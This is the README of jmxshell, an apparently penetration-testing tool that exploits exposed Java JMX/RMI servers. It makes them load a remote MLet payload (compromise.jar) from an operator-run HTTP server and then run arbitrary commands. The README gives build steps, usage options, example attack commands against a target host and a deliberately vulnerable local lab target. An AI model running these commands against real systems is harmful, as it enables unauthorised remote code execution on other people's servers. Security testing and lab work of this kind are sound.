# jmxshell

[![CI](https://github.com/mirchr/jmxshell/actions/workflows/ci.yml/badge.svg)](https://github.com/mirchr/jmxshell/actions/workflows/ci.yml)
[![Release](https://github.com/mirchr/jmxshell/actions/workflows/release.yml/badge.svg)](https://github.com/mirchr/jmxshell/actions/workflows/release.yml)

A fork of [https://www.optiv.com/blog/exploiting-jmx-rmi](https://web.archive.org/web/20190717050808/https://www.optiv.com/blog/exploiting-jmx-rmi). Braden Thomas did a great job of documenting and providing a working PoC for exploiting Java application servers using JMX/RMI. This version aims to make that code more usable by making small tweaks to the interface and extending the capabilities.

## Building

The project uses Gradle and produces Java 8 compatible bytecode by default, so the produced jars run on any JRE 8+.

```sh
./gradlew build                       # default: target JDK 8
./gradlew build -PtargetJdk=11        # target JDK 11
./gradlew build -PtargetJdk=25        # target JDK 25
```

Outputs:
- `build/libs/jmxshell-<version>.jar` — unified client (exploit + cleanup in a single executable jar)
- `build/web/compromise.jar` — MLet payload served to the target JVM
- `build/target/jmx-target.jar` — standalone deliberately-vulnerable JMX target for local testing
- `build/distributions/jmxshell-<version>-jdk<N>.zip` — bundled client + payload zip

To render `web/woot.html` from the template for a specific URL serving `compromise.jar`:

```sh
./gradlew mletFile -PmletUrl=http://10.0.0.1:8000
# writes build/web/woot.html
```

## Usage

```
jmxshell --target <host> --jmxPort <port> --command <cmd> --lhost <ip> --lport <port> [--username <u> --password <p>]
jmxshell --target <host> --jmxPort <port> --cleanup [--username <u> --password <p>]
```

Options:

| Option | Description |
| --- | --- |
| `--target <host>` | JMX RMI server hostname or IP |
| `--jmxPort <port>` | JMX RMI server port |
| `--command <cmd>` | Command to execute on the target (exploit mode) |
| `--lhost <ip>` | Listen host the target fetches `woot.html` / `compromise.jar` from |
| `--lport <port>` | Listen port (`CODEBASE = http://<lhost>:<lport>`) |
| `--cleanup` | Remove MLet beans previously installed by this tool |
| `--username <u>` | JMX username — must be paired with `--password` |
| `--password <p>` | JMX password — must be paired with `--username` |
| `--help`, `-h` | Print help and exit |
| `--version`, `-V` | Print version and exit |

If neither `--username` nor `--password` is supplied, the connection is anonymous (the original behavior). Supplying only one of the two is rejected with a usage error.

## Example

In one terminal, serve the payload and mlet definition over HTTP:

```sh
./gradlew build mletFile -PmletUrl=http://10.0.0.1:8000
cd build/web && python3 -m http.server 8000
```

In another, drive the target:

```sh
java -jar build/libs/jmxshell-1.0.0.jar \
    --target target.example.com --jmxPort 1099 \
    --command 'id' --lhost 10.0.0.1 --lport 8000
```

When done, remove the registered MBeans:

```sh
java -jar build/libs/jmxshell-1.0.0.jar --target target.example.com --jmxPort 1099 --cleanup
```

## Trying it locally

The build ships a standalone vulnerable JMX target (`build/target/jmx-target.jar`) so you can exercise jmxshell end-to-end without finding a real target. **Do not run this on a host reachable from an untrusted network.**

Use three terminals.

**Terminal 1 — start the vulnerable target on port 1099:**

```sh
./gradlew runTarget          # binds 127.0.0.1:1099, no auth, no SSL
```

**Terminal 2 — serve the MLet payload on port 8000:**

```sh
./gradlew build mletFile -PmletUrl=http://127.0.0.1:8000
cd build/web && python3 -m http.server 8000
```

**Terminal 3 — drive the exploit:**

```sh
java -jar build/libs/jmxshell-1.0.0.jar \
    --target 127.0.0.1 --jmxPort 1099 \
    --command /bin/id \
    --lhost 127.0.0.1 --lport 8000

java -jar build/libs/jmxshell-1.0.0.jar --target 127.0.0.1 --jmxPort 1099 --cleanup
```

Or run all of the above as a single end-to-end test that asserts `/bin/id` returns a `uid=` line:

```sh
scripts/integration-test.sh           # uses the JDK 8 build
scripts/integration-test.sh 21        # uses the JDK 21 build
JAVA_HOME=/path/to/jdk25 scripts/integration-test.sh 25
```

## CI

GitHub Actions runs the same matrix on every push to `dev` (CI) and on every `v*` tag (Release): build with the requested target JDK, run the integration test using that same JDK for both the target app and the jmxshell client, then upload `jmxshell-jdk<N>` as an artifact. Targets covered: Temurin JDK 8, 11, and 17, and Oracle JDK 21.

> JDK 23+ note: `javax.management.loading.MLet` was removed from the JDK in version 23 ([JDK-8297948](https://bugs.openjdk.org/browse/JDK-8297948)), so the MLet-based exploit primitive cannot succeed against a JDK 23+ target. JDK 25 is therefore not in the build matrix; the jmxshell client jar would build fine but the integration test cannot pass against a JDK 23+ target.
